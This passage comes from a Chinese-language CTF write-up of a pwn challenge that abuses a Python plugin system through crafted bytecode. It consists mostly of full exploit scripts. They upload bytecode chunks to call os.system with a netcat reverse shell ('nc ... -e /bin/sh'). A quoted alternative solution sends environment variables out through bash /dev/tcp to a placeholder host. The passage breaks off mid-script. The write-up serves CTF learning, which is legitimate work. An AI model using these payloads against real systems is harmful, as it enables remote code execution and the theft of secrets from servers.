chunks"></a>Upload exploit bytecode in chunks</h4><figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python">exp_bc = exp_bc.ljust(num_chunks*chunk_size, <span class="hljs-string">b&#x27;;&#x27;</span>)<br>exp_block = []<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>, <span class="hljs-built_in">len</span>(exp_bc), chunk_size):<br>    exp_block.append(exp_bc[i:i+chunk_size])<br>    upload_key(exp_block[-<span class="hljs-number">1</span>])<br></code></pre></div></td></tr></table></figure><p>æŠŠexpåˆ†æˆchunkä¸Šä¼ åˆ°keysä¸­å, å†ä¸Šä¼ å¤šä¸ªlimit_codeä½œä¸ºplugin, ç”¨äºå°†æ¯ä¸ªkeyä¸­çš„exp_bcé™„åŠ åˆ°log(å…¶å®æ˜¯<code>./plugins</code>)åé¢, æ‹¼æ¥æˆexp. </p><ul><li>è¦æ³¨æ„çš„æ˜¯keysåŠ å…¥constsçš„æ—¶å€™æ˜¯é€šè¿‡éå†dictæ¥å®ç°çš„, <del>æ‰€ä»¥constsé¡ºåºæ˜¯å­—å…¸åºä»å¤§åˆ°å°</del>.foréå†è¾“å‡ºå±…ç„¶æ˜¯æŒ‰ç…§<a href="https://docs.python.org/3.10/library/stdtypes.html#dictionary-view-objects">åŠ å…¥çš„é¡ºåº</a>, æµ‹è¯•çš„æ—¶å€™æ˜¯ç›´æ¥èµ‹åˆå€¼ç„¶åè¾“å‡º, ç»“æœæ˜¯å­—å…¸åº. æœ€åæ˜¯plugin_logå‡½æ•°object. è¿™å¯¼è‡´æ¯ä¸ªlimit_codeä¸­msgçš„åç§»éƒ½ä¸ä¸€æ ·, ä½†filenameå’Œrawæ˜¯ä¸€æ ·çš„. </li><li><del>ä¹Ÿä¸å¯¹å•Š, <code>for k in entries</code>è¿™æ ·å–å‡ºæ¥çš„æ˜¯å­—å…¸ä¸­çš„tuple, è¿™ä¸€ä¸ªtupleæ€ä¹ˆload_constå†decode?</del> </li></ul><blockquote><p>pythonä¸è¿‡å…³, åšé¢˜ä¸¤è¡Œæ³ª: <code>list(dict)</code><a href="https://docs.python.org/3.11/library/stdtypes.html#mapping-types-dict">åªä¼šè¿”å›key</a>, è€Œ<code>for k in dict</code>åŒç†â€¦â€¦â€¦.</p><blockquote><p><strong>iter(d)</strong>: Return an iterator over the keys of the dictionary. This is a shortcut for <code>iter(d.keys())</code>.</p></blockquote><figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python">&gt;&gt;&gt;d<br>&#123;<span class="hljs-string">&#x27;one&#x27;</span>: <span class="hljs-number">1</span>, <span class="hljs-string">&#x27;two&#x27;</span>: <span class="hljs-number">2</span>, <span class="hljs-string">&#x27;three&#x27;</span>: <span class="hljs-number">3</span>, <span class="hljs-string">&#x27;four&#x27;</span>: <span class="hljs-number">4</span>&#125;<br>&gt;&gt;&gt;<span class="hljs-built_in">list</span>(d)<br>[<span class="hljs-string">&#x27;one&#x27;</span>, <span class="hljs-string">&#x27;two&#x27;</span>, <span class="hljs-string">&#x27;three&#x27;</span>, <span class="hljs-string">&#x27;four&#x27;</span>]<br>&gt;&gt;&gt;<span class="hljs-built_in">list</span>(d.values())<br>[<span class="hljs-number">1</span>, <span class="hljs-number">2</span>, <span class="hljs-number">3</span>, <span class="hljs-number">4</span>]<br></code></pre></div></td></tr></table></figure></blockquote><h4 id="Upload-additional-consts-amp-construct-expl-amp"><a href="#Upload-additional-consts-amp-construct-expl-amp" class="headerlink" title="Upload additional consts &amp; construct ./expl &amp;"></a>Upload additional consts &amp; construct ./expl &amp;</h4><figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-comment">#used for plugins</span><br>upload_key(<span class="hljs-string">b&#x27;plugins/expl&#x27;</span>)<br><br><span class="hljs-comment">#exec plugins to store exp to plugins/expl</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">6</span>):<br>    plugin(<span class="hljs-string">f&#x27;../plugins/<span class="hljs-subst">&#123;i&#125;</span>&#x27;</span>.encode())<br><br><span class="hljs-comment">#used for ./expl</span><br>ip = <span class="hljs-string">&#x27;127.0.0.1&#x27;</span><br>rev_port = <span class="hljs-number">5555</span><br>commmand = <span class="hljs-string">f&quot;nc <span class="hljs-subst">&#123;ip&#125;</span> <span class="hljs-subst">&#123;rev_port&#125;</span> -e /bin/sh&quot;</span>.ljust(chunk_size * <span class="hljs-number">3</span>, <span class="hljs-string">&quot; &quot;</span>)<br>upload_key(commmand[:chunk_size])<br>upload_key(commmand[chunk_size : <span class="hljs-number">2</span> * chunk_size])<br>upload_key(commmand[<span class="hljs-number">2</span> * chunk_size :])<br></code></pre></div></td></tr></table></figure><p>ä¸ºä»€ä¹ˆä¸¤ä¸ªuploadä¸­é—´å¤¹ä¸ªpluginåœ¨ä¸Šé¢è§£é‡Šäº†. </p><h4 id="REVERSE-SHELL"><a href="#REVERSE-SHELL" class="headerlink" title="REVERSE SHELL"></a>REVERSE SHELL</h4><figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python">rev_shl = listen(rev_port)<br>plugin(<span class="hljs-string">f&#x27;expl&#x27;</span>.ljust(<span class="hljs-number">12</span>, <span class="hljs-string">&#x27; &#x27;</span>).encode())<br>rev_shl.sendline(<span class="hljs-string">b&#x27;echo $flag&#x27;</span>)<br>flag = rev_shl.recvline(<span class="hljs-literal">False</span>)<br>log.success(flag)<br></code></pre></div></td></tr></table></figure><p>å…¶å®è¡Œä¸é€š, ä¸çŸ¥é“å®¹å™¨é‡Œé¢çš„ç¨‹åºè¦æ€ä¹ˆè¿æ¥åˆ°ä¸»æœºé‡Œå·²åœ¨ç›‘å¬çš„æ¥å£. å®é™…ä¸Šè¿˜è¦ä¸€ä¸ªå…¬ç½‘IPæ‰èƒ½åå¼¹, è¿˜æ²¡æ¥è§¦è¿‡. </p><p>æœ¬åœ°æ˜¯åœ¨containeré‡Œé¢éªŒè¯è¿‡äº†exp. </p><p>complete exp:</p><figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">import</span> dis<br>context.log_level = <span class="hljs-string">&#x27;info&#x27;</span><br>context.arch = <span class="hljs-string">&#x27;amd64&#x27;</span><br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">store</span>(<span class="hljs-params">key: <span class="hljs-built_in">bytes</span>, data: <span class="hljs-built_in">bytes</span></span>):</span><br>    <span class="hljs-keyword">assert</span> <span class="hljs-built_in">len</span>(key) &lt;= <span class="hljs-number">12</span>, <span class="hljs-string">&#x27;store key len&#x27;</span><br>    <span class="hljs-keyword">assert</span> <span class="hljs-built_in">len</span>(<span class="hljs-built_in">list</span>(<span class="hljs-built_in">filter</span>(<span class="hljs-keyword">lambda</span> x: x <span class="hljs-keyword">in</span> <span class="hljs-string">&#x27;0123456789abcdef&#x27;</span>, data.decode()))<br>               ) == <span class="hljs-built_in">len</span>(data) <span class="hljs-keyword">and</span> <span class="hljs-built_in">len</span>(data) &lt; <span class="hljs-number">0x80</span>, <span class="hljs-string">&quot;data has to be in hex format&quot;</span><br>    p = remote(<span class="hljs-string">&#x27;127.0.0.1&#x27;</span>, <span class="hljs-number">4444</span>)<br>    p.send(<span class="hljs-string">b&#x27;S&#x27;</span>)<br>    p.send(key)<br>    p.send(<span class="hljs-built_in">chr</span>(<span class="hljs-built_in">len</span>(data)))<br>    p.send(data)<br>    p.recvuntil(<span class="hljs-string">f&#x27;<span class="hljs-subst">&#123;key&#125;</span>\n&#x27;</span>.encode(), timeout=<span class="hljs-number">1</span>)<br>    p.close()<br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">dump</span>():</span><br>    p = remote(<span class="hljs-string">&#x27;127.0.0.1&#x27;</span>, <span class="hljs-number">4444</span>)<br>    p.send(<span class="hljs-string">b&#x27;D&#x27;</span>)<br>    p.clean()<br>    p.close()<br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">plugin</span>(<span class="hljs-params">name</span>):</span><br>    <span class="hljs-keyword">assert</span> <span class="hljs-built_in">len</span>(name) == <span class="hljs-number">12</span><br>    p = remote(<span class="hljs-string">&#x27;127.0.0.1&#x27;</span>, <span class="hljs-number">4444</span>)<br>    p.send(<span class="hljs-string">b&#x27;P&#x27;</span>)<br>    p.send(name)<br>    p.clean(timeout = <span class="hljs-number">0.3</span>)<br>    p.close()<br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">load_const</span>(<span class="hljs-params">idx</span>):</span><br>    <span class="hljs-keyword">return</span> <span class="hljs-built_in">bytes</span>([dis.opmap[<span class="hljs-string">&#x27;LOAD_CONST&#x27;</span>], idx])<br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">load_name</span>(<span class="hljs-params">idx</span>):</span><br>    <span class="hljs-keyword">return</span> <span class="hljs-built_in">bytes</span>([dis.opmap[<span class="hljs-string">&#x27;LOAD_NAME&#x27;</span>], idx])<br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">upload_key</span>(<span class="hljs-params">key</span>):</span><br>    <span class="hljs-keyword">if</span> <span class="hljs-built_in">isinstance</span>(key, <span class="hljs-built_in">str</span>):<br>        key = key.encode()<br>    store(key, <span class="hljs-string">b&#x27;deadbeef&#x27;</span>)<br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">get_plugin_code</span>(<span class="hljs-params">msg_idx, func_idx, fn_idx, raw_idx</span>):</span><br>    log.success(<span class="hljs-string">f&#x27;four args: <span class="hljs-subst">&#123;msg_idx&#125;</span> <span class="hljs-subst">&#123;func_idx&#125;</span> <span class="hljs-subst">&#123;fn_idx&#125;</span> <span class="hljs-subst">&#123;raw_idx&#125;</span>&#x27;</span>)<br>    <span class="hljs-keyword">return</span> (<br>        <span class="hljs-comment">#load seventh callable to plugin_log + unused 456</span><br>        load_const(func_idx) * <span class="hljs-number">4</span> +<br>        <span class="hljs-comment">#load top three args</span><br>        load_const(raw_idx) + load_const(fn_idx) + load_const(msg_idx) +<br>        <span class="hljs-comment">#call log()</span><br>        <span class="hljs-built_in">bytes</span>([dis.opmap[<span class="hljs-string">&#x27;WITH_EXCEPT_START&#x27;</span>], <span class="hljs-number">0x30</span>])<br>    )<br><br><span class="hljs-comment"># This is the index where we will later store the nc command</span><br>nc_index = <span class="hljs-number">55</span><br>co_names = [<span class="hljs-string">&quot;len&quot;</span>, <span class="hljs-string">&quot;list&quot;</span>, <span class="hljs-string">&quot;print&quot;</span>, <span class="hljs-string">&quot;os&quot;</span>, <span class="hljs-string">&quot;system&quot;</span>, <span class="hljs-string">&quot;decode&quot;</span>] <span class="hljs-comment">#, &#x27;0&#x27;, &#x27;1&#x27;, &#x27;2&#x27;, &#x27;3&#x27;, &#x27;4&#x27;, &#x27;5&#x27;]</span><br>exploit_asm = [<br>    <span class="hljs-comment"># Get length of empty list to push 0 on the stack</span><br>    (<span class="hljs-string">&quot;BUILD_LIST&quot;</span>, <span class="hljs-number">0</span>),<br>    <span class="hljs-comment"># Use NOP as arg to simplify compiler ?????what is nop?? ä¸å°±æ˜¯å‹å…¥äº†ä¸€ä¸ªlongç±»å‹çš„0å—, è¿™ä¸ªæŒ‡ä»¤ä¸éœ€è¦å‚æ•°.</span><br>    (<span class="hljs-string">&quot;GET_LEN&quot;</span>, <span class="hljs-number">0x09</span>),<br>    <span class="hljs-comment"># Invoke print() to push None onto the stack</span><br>    (<span class="hljs-string">&quot;LOAD_NAME&quot;</span>, co_names.index(<span class="hljs-string">&quot;print&quot;</span>)),<br>    (<span class="hljs-string">&quot;CALL_FUNCTION&quot;</span>, <span class="hljs-number">0</span>),<br>    <span class="hljs-comment"># Import os</span><br>    (<span class="hljs-string">&quot;IMPORT_NAME&quot;</span>, co_names.index(<span class="hljs-string">&quot;os&quot;</span>)),<br>    <span class="hljs-comment"># Invoke os.system()</span><br>    (<span class="hljs-string">&quot;LOAD_METHOD&quot;</span>, co_names.index(<span class="hljs-string">&quot;system&quot;</span>)),<br>    <span class="hljs-comment"># Decode first batch of nc command</span><br>    (<span class="hljs-string">&quot;LOAD_CONST&quot;</span>, nc_index),<span class="hljs-comment">#loadäº†ä¸€ä¸ªstring object, æ‰€ä»¥å¯ä»¥åœ¨ä»–ä¹‹ä¸Šè°ƒç”¨decodeå‡½æ•°.</span><br>    (<span class="hljs-string">&quot;LOAD_METHOD&quot;</span>, co_names.index(<span class="hljs-string">&quot;decode&quot;</span>)),<br>    (<span class="hljs-string">&quot;CALL_METHOD&quot;</span>, <span class="hljs-number">0</span>),<br>    <span class="hljs-comment"># Decode second batch of nc command</span><br>    (<span class="hljs-string">&quot;LOAD_CONST&quot;</span>, nc_index + <span class="hljs-number">1</span>),<br>    (<span class="hljs-string">&quot;LOAD_METHOD&quot;</span>, co_names.index(<span class="hljs-string">&quot;decode&quot;</span>)),<br>    (<span class="hljs-string">&quot;CALL_METHOD&quot;</span>, <span class="hljs-number">0</span>),<br>    <span class="hljs-comment"># Decode third batch of nc command</span><br>    (<span class="hljs-string">&quot;LOAD_CONST&quot;</span>, nc_index + <span class="hljs-number">2</span>),<br>    (<span class="hljs-string">&quot;LOAD_METHOD&quot;</span>, co_names.index(<span class="hljs-string">&quot;decode&quot;</span>)),<br>    (<span class="hljs-string">&quot;CALL_METHOD&quot;</span>, <span class="hljs-number">0</span>),<br>    <span class="hljs-comment"># Concatenate the three strings</span><br>    (<span class="hljs-string">&quot;BUILD_STRING&quot;</span>, <span class="hljs-number">3</span>),<br>    <span class="hljs-comment"># Finaly invoke the nc command</span><br>    (<span class="hljs-string">&quot;CALL_METHOD&quot;</span>, <span class="hljs-number">1</span>)<br>]<br><br>exp_bc = <span class="hljs-string">b&#x27;&#x27;</span><br><span class="hljs-keyword">for</span> op, arg <span class="hljs-keyword">in</span> exploit_asm:<br>    exp_bc += <span class="hljs-built_in">bytes</span>([dis.opmap[op], arg])<br><span class="hljs-keyword">for</span> name <span class="hljs-keyword">in</span> co_names:<br>    exp_bc += <span class="hljs-string">b&#x27;;&#x27;</span> + name.encode()<br>exp_bc += <span class="hljs-string">b&#x27;;&#x27;</span><br><br><span class="hljs-comment">#fill slots</span><br>chunk_size = <span class="hljs-number">12</span><br>num_chunks = <span class="hljs-built_in">len</span>(exp_bc) // chunk_size + <span class="hljs-number">1</span><br><span class="hljs-comment"># num_chunk is 6, limit_code is 6, total is 12, and plugin_log will be 13</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">48</span> - num_chunks):<br>    upload_key(<span class="hljs-string">b&#x27;&#123;&#123;&#123;&#123;&#123;&#123;&#123;&#123;&#123;&#123;%d&#x27;</span> % (i+<span class="hljs-number">10</span>))<br><br><span class="hljs-comment">#upload limit_code as serveral plugins in data</span><br>func_idx = <span class="hljs-number">48</span>+<span class="hljs-number">6</span>+<span class="hljs-number">1</span><br>msg_idx = <span class="hljs-number">0x30</span><br>fn_idx = <span class="hljs-number">0x30</span>+<span class="hljs-number">6</span><br>raw_idx = <span class="hljs-number">0x30</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(num_chunks):<br>    bc = get_plugin_code(i+msg_idx, func_idx, fn_idx, raw_idx)<br>    store(<span class="hljs-string">b&#x27;../plugins/%d&#x27;</span> % i, bc)<br>dump()<br><br>exp_bc = exp_bc.ljust(num_chunks*chunk_size, <span class="hljs-string">b&#x27;;&#x27;</span>)<br>exp_block = []<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>, <span class="hljs-built_in">len</span>(exp_bc), chunk_size):<br>    exp_block.append(exp_bc[i:i+chunk_size])<br>    upload_key(exp_block[-<span class="hljs-number">1</span>])<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;exp_block:&#x27;</span>)<br><span class="hljs-built_in">print</span>(exp_block)<br><br><span class="hljs-comment">#fn_idx</span><br>upload_key(<span class="hljs-string">b&#x27;plugins/expl&#x27;</span>)<br><br><span class="hljs-comment">#exec plugins to store exp to plugins/expl</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">6</span>):<br>    plugin(<span class="hljs-string">f&#x27;../plugins/<span class="hljs-subst">&#123;i&#125;</span>&#x27;</span>.encode())<br><br>ip = <span class="hljs-string">&#x27;127.0.0.1&#x27;</span><br>rev_port = <span class="hljs-number">5555</span><br>commmand = <span class="hljs-string">f&quot;nc <span class="hljs-subst">&#123;ip&#125;</span> <span class="hljs-subst">&#123;rev_port&#125;</span> -e /bin/sh&quot;</span>.ljust(chunk_size * <span class="hljs-number">3</span>, <span class="hljs-string">&quot; &quot;</span>)<br>upload_key(commmand[:chunk_size])<br>upload_key(commmand[chunk_size : <span class="hljs-number">2</span> * chunk_size])<br>upload_key(commmand[<span class="hljs-number">2</span> * chunk_size :])<br><br><span class="hljs-comment"># rev_shl = listen(rev_port)</span><br>plugin(<span class="hljs-string">f&#x27;expl&#x27;</span>.ljust(<span class="hljs-number">12</span>, <span class="hljs-string">&#x27; &#x27;</span>).encode())<br><span class="hljs-comment"># rev_shl.sendline(b&#x27;echo $flag&#x27;)</span><br><span class="hljs-comment"># flag = rev_shl.recvline(False)</span><br><span class="hljs-comment"># log.success(flag)</span><br></code></pre></div></td></tr></table></figure><h4 id="å…¶å®è¿˜æ˜¯å¤æ‚äº†"><a href="#å…¶å®è¿˜æ˜¯å¤æ‚äº†" class="headerlink" title="å…¶å®è¿˜æ˜¯å¤æ‚äº†"></a>å…¶å®è¿˜æ˜¯å¤æ‚äº†</h4><p><a href="https://ptr-yudai.hatenablog.com/entry/2022/11/06/163123#Pwn-Pasta-Ordersystem-%EF%B8%8F-14-solves--343-pts">writeup3</a> </p><p>è¿™ç¯‡wpä½¿ç”¨çš„æ–¹æ³•æ˜¯ç”¨<code>eval()</code>æ¥è§£æåå¼¹shellå‘½ä»¤, è€Œä»constsåŠ è½½çš„å‘½ä»¤å­—ç¬¦ä¸²å¯ç›´æ¥ä½¿ç”¨<code>BINARY_ADD</code>æŒ‡ä»¤æ¥æ‹¼æ¥(å½“ç„¶<code>BUILD_STRING</code>æ„Ÿè§‰æ›´å¥½). åœ¨exp_bcåé¢åŠ ä¸Šäº†returnè¯­å¥, (åº”è¯¥)å¯ä»¥é¿å…unknown opcodeçš„æŠ¥é”™. </p><p>å¹¶æ²¡æœ‰æŠŠå¤šä¸ªå†™å…¥æ“ä½œåˆ†æˆå¤šä¸ªæ–‡ä»¶, è€Œæ˜¯</p><figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-keyword">from</span> ptrlib <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">import</span> time<br><span class="hljs-keyword">import</span> os<br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">make_conn</span>():</span><br>    <span class="hljs-keyword">return</span> Socket(<span class="hljs-string">&quot;localhost&quot;</span>, <span class="hljs-number">4444</span>)<br>    <span class="hljs-comment">#return Socket(&quot;23.88.100.81&quot;, 44463)</span><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">store</span>(<span class="hljs-params">entry, data</span>):</span><br>    <span class="hljs-keyword">assert</span> <span class="hljs-built_in">len</span>(entry) &lt;= <span class="hljs-number">12</span><br>    <span class="hljs-keyword">assert</span> <span class="hljs-built_in">len</span>(data) &lt; <span class="hljs-number">0x80</span><br>    sock = make_conn()<br>    sock.send(<span class="hljs-string">&#x27;S&#x27;</span>)<br>    sock.send(entry + <span class="hljs-string">b&#x27;\x00&#x27;</span> * (<span class="hljs-number">12</span> - <span class="hljs-built_in">len</span>(entry)))<br>    sock.send(<span class="hljs-built_in">bytes</span>([<span class="hljs-built_in">len</span>(data) * <span class="hljs-number">2</span>]))<br>    sock.send(data.<span class="hljs-built_in">hex</span>())<br>    <span class="hljs-built_in">print</span>(sock.recvline())<br>    sock.close()<br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">dump</span>():</span><br>    sock = make_conn()<br>    sock.send(<span class="hljs-string">&#x27;D&#x27;</span>)<br>    <span class="hljs-built_in">print</span>(sock.recv())<br>    sock.close()<br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">plugin</span>(<span class="hljs-params">name</span>):</span><br>    sock = make_conn()<br>    sock.send(<span class="hljs-string">&#x27;P&#x27;</span>)<br>    sock.send(name + <span class="hljs-string">b&#x27;\x00&#x27;</span> * (<span class="hljs-number">12</span> - <span class="hljs-built_in">len</span>(name)))<br>    sock.close()<br><span class="hljs-comment"># &#x27;/&#x27; is not valid as filename so use \x2f instead</span><br>pycode = <span class="hljs-string">b&quot;__import__(&#x27;os&#x27;).system(&#x27;bash -c \&quot;env &gt; \\x2fdev\\x2ftcp\\x2f&lt;HOST&gt;\\x2f&lt;PORT&gt;\&quot;&#x27;)&quot;</span><br>pychunks = chunks(pycode, <span class="hljs-number">12</span>, <span class="hljs-string">b&#x27;\n&#x27;</span>)<br>code = <span class="hljs-built_in">bytes</span>([<br>    <span class="hljs-number">116</span>,<span class="hljs-number">0x00</span>, <span class="hljs-comment"># LOAD_GLOBAL (eval)</span><br>])<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(pychunks)):<br>    code += <span class="hljs-built_in">bytes</span>([<span class="hljs-number">100</span>,i])  <span class="hljs-comment"># LOAD_CONST</span><br>    <span class="hljs-keyword">if</span> i &gt; <span class="hljs-number">0</span>:<br>        code += <span class="hljs-built_in">bytes</span>([<span class="hljs-number">0x17</span>,<span class="hljs-number">0x00</span>]) <span class="hljs-comment"># BINARY_ADD</span><br>code += <span class="hljs-built_in">bytes</span>([<br>    <span class="hljs-number">0x09</span>,<span class="hljs-number">0xc2</span>,  <span class="hljs-comment"># NOP</span><br>    <span class="hljs-number">0x83</span>,<span class="hljs-number">0x01</span>, <span class="hljs-comment"># LOAD_METHOD (eval) è¿™æ˜¯ä»€ä¹ˆä¸œè¥¿, æ˜æ˜æ˜¯CALL_FUNCTION</span><br>    <span class="hljs-number">0x01</span>,<span class="hljs-number">0x00</span>, <span class="hljs-comment"># POP_TOP</span><br>    <span class="hljs-number">100</span>,<span class="hljs-number">0x00</span>, <span class="hljs-comment"># LOAD_CONST (None)</span><br>    <span class="hljs-number">83</span>,<span class="hljs-number">0x00</span>, <span class="hljs-comment"># RETURN_VALUE</span><br>])<br>data = code + <span class="hljs-string">b&quot;;eval;&quot;</span><br>blocks = chunks(data, <span class="hljs-number">12</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>)<br>pos_func = <span class="hljs-number">0x33</span> + <span class="hljs-built_in">len</span>(blocks)<br>code = <span class="hljs-string">b&quot;&quot;</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(blocks)):<br>    code += <span class="hljs-built_in">bytes</span>([<br>        <span class="hljs-number">100</span>,pos_func, <span class="hljs-number">100</span>,<span class="hljs-number">0x30</span>, <span class="hljs-number">100</span>,<span class="hljs-number">0x30</span>, <span class="hljs-number">100</span>,<span class="hljs-number">0x30</span>, <span class="hljs-comment"># func</span><br>        <span class="hljs-number">100</span>,<span class="hljs-number">0x30</span>, <span class="hljs-number">100</span>,<span class="hljs-number">0x32</span>, <span class="hljs-number">100</span>,<span class="hljs-number">0x33</span>+i, <span class="hljs-comment"># raw, filename, msg</span><br>        <span class="hljs-number">49</span>, <span class="hljs-number">0x30</span>, <span class="hljs-comment"># call by exception</span><br>    ])<br>code += <span class="hljs-built_in">bytes</span>([<span class="hljs-number">53</span>,<span class="hljs-number">53</span>])<br><span class="hljs-keyword">for</span> piece <span class="hljs-keyword">in</span> 